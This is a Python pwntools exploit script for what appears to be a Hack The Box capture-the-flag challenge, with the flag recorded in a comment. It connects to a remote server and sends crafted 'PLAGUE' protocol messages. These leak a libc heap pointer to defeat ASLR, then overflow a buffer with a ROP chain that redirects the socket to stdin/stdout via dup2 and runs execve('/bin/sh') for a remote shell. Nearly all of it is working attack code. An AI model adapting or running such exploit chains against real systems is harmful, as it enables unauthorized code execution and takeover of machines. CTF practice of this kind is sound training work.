from pwn import *



'''
HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}

7           31              15
action, target_competitor, version

VIEW    
ACTION: 
VIEW
PLAGUE

'''


context.arch='amd64'

domain="94.237.48.117" # 
port=36386

# r= remote("localhost",9001)
# s = remote("localhost",9001)
# t = remote("localhost",9001)

r=remote(domain,port)
s=remote(domain,port)
t=remote(domain,port)
libc = ELF("./libc6_2.31-0ubuntu9.14_amd64.so")



terminate_header =b'\r\n\r\n'
plague_message=b'PLAGUE'.ljust(7,b' ')+ b'JEYANTHAN1'.ljust(31,b' ') +b'C'*15+b'\r\n'
plague_message+=b'Content-Length: 7\r\n'
plague_message+=b'Plague-Target: AAAAAAAAAAAAAAAA\r\n'


r.sendline(plague_message)
r.sendline(terminate_header)
r.sendline(b'A'*7)




###### step 2 leak 
plague_message2=b'PLAGUE'.ljust(7,b' ')+ b'JEYANTHAN2'.ljust(31,b' ') +b'C'*15+b'\r\n'
plague_message2+=b'Content-Length: 20\r\n'
plague_message2+=b'Plague-Target: A\r\n'


s.sendline(plague_message2)
s.sendline(terminate_header)
s.sendline(b'ZZZZZZ')


s.recvuntil(b'ZZZZZZ\n')
leak_main_arena = u64(s.recv()[:8])

main_arena_offset= 0x01ECB80
libc_base = leak_main_arena - (main_arena_offset+96)

print("main_arena+96", hex(leak_main_arena))
print("libc base", hex(libc_base))




##### step 3 overflow

pop_rdi_ret= libc_base+0x0000000000023b6a #: pop rdi; ret; 
pop_rsi_ret =libc_base+ 0x000000000002601f# : pop rsi; ret; 
pop_rdx_rcx_rbx = libc_base+0x000000000010257d#: pop rdx; pop rcx; pop rbx; ret; 

libc_binsh=libc_base+next(libc.search(b'/bin/sh\x00'))

syscall_ret= libc_base+0x00000000000630a9 #: syscall; ret; 
pop_rax =   libc_base+0x0000000000036174# : pop rax; ret; 


sockfd=6

plague_message3=b'PLAGUE'.ljust(7,b' ')+ b'me'.ljust(31,b' ') +b'C'*15+b'\r\n'
final_payload = b'a'*2056
final_payload+=b'A'*39


##dup2(fd,0)
final_payload+= p64(pop_rdi_ret)
final_payload+= p64(sockfd)
final_payload+= p64(pop_rsi_ret)
final_payload+= p64(0)
final_payload+=p64(pop_rax)
final_payload+=p64(33)
final_payload+= p64(syscall_ret)

#### dup2(fd,1)
final_payload+= p64(pop_rdi_ret)
final_payload+= p64(sockfd)
final_payload+= p64(pop_rsi_ret)
final_payload+= p64(1)
final_payload+=p64(pop_rax)
final_payload+=p64(33)
final_payload+= p64(syscall_ret)


####execve("/bin/sh",0,0)
final_payload+= p64(pop_rdi_ret)
final_payload+= p64(libc_binsh)
final_payload+= p64(pop_rsi_ret)
final_payload+= p64(0)
final_payload+= p64(pop_rdx_rcx_rbx)
final_payload+= p64(0)
final_payload+= p64(0)
final_payload+= p64(0)
final_payload+=p64(pop_rax)
final_payload+=p64(59)
final_payload+= p64(syscall_ret)



plague_message3+=final_payload
t.sendline(plague_message3+ terminate_header)

t.interactive()
r.interactive()
s.interactive()


